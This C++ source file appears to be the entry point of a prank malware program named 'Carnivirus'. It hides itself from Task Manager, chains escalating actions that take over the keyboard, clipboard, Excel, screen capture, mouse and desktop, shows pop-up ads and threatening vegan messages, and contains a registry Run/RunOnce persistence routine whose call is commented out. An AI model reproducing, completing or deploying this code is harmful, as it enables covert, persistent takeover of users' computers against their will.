#include <stdlib.h>
#include <time.h>
#include "VeganProgress.h"
#include "MessageAction.h"
#include "SoundAction.h"
#include "CaptureAction.h"
#include "ImageAction.h"
#include "SystemAction.h"
#include "MouseManager.h"
#include "FruitThrowAction.h"
#include "DesktopManager.h"
#include "DesktopAction.h"
#include "ClipBoardAction.h"
#include "KeyboardAction.h"
#include "ExcelAction.h"
#include "PopUpAdsAction.h"
#include "TaskManager.h"

#define MIN_INITIAL_SLEEP 1000
#define MAX_INITIAL_SLEEP 2000

// full after half hour
#define PASSIVE_PROGRESS_REDUCTION_PER_SEC (1. / 1800)
#define PATH_LENGTH 200

void drawUpdate(double dt);
void setAutoRun();

Draw* draw;
VeganProgress* veganProgress;

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{
    
    srand(time(NULL));
    Sleep(rand() / RAND_MAX * (MAX_INITIAL_SLEEP - MIN_INITIAL_SLEEP) + MIN_INITIAL_SLEEP);

    // setAutoRun();
    draw = new Draw(hInstance, drawUpdate);
    MouseManager mouseManager;
    DesktopManager desktopManager;
    AudioManager audioManager;
    TaskManagerHide taskManager;

    taskManager.start();
    
    veganProgress = new VeganProgress(draw);
    veganProgress->addAction(new KeyboardAction(1, veganProgress));
    veganProgress->addAction(new ClipBoardAction(0.955, veganProgress));
    veganProgress->addAction(new ExcelAction(0.91));
    veganProgress->addAction(new MessageAction(0.83, "Being a vegan is awesome!"));
    veganProgress->addAction(new ImageAction(0.76, draw));
    veganProgress->addAction(new CaptureAction(0.68, hInstance));
    veganProgress->addAction(new MessageAction(0.62, "Stay away from those pesky carnivores >:("));
    veganProgress->addAction(new FruitThrowAction(0.52, draw, mouseManager, audioManager));
    veganProgress->addAction(new PopUpAdsAction(0.42, draw));
    veganProgress->addAction(new SoundAction(0.31, audioManager));
    veganProgress->addAction(new MessageAction(0.21, "Veganism is the only way! If you don't agree, there will be consequences..."));
    veganProgress->addAction(new DesktopAction(0.1, draw, mouseManager, desktopManager));
    veganProgress->addAction(new SystemAction(0));

    while (draw->update());

    delete draw;
    return 0;
}

// the function updates the screen
void drawUpdate(double dt)
{
    veganProgress->draw(dt);
    veganProgress->addProgress(-dt * PASSIVE_PROGRESS_REDUCTION_PER_SEC);
}

// function sets this program in auto runs in the registry
// input: none
// return: none
void setAutoRun()
{
    // get path
    wchar_t currentPath[PATH_LENGTH] = { 0 };
    GetModuleFileNameW(NULL, currentPath, PATH_LENGTH);

    HKEY hkey = NULL;
    RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
    RegSetValueExW(hkey, L"Carnivirus", 0, REG_SZ, (BYTE*)currentPath, lstrlen(currentPath) * sizeof(WCHAR));
    RegCloseKey(hkey);

    RegCreateKeyW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hkey);
    RegSetValueExW(hkey, L"Carnivirus", 0, REG_SZ, (BYTE*)currentPath, lstrlen(currentPath) * sizeof(WCHAR));
    RegCloseKey(hkey);
}
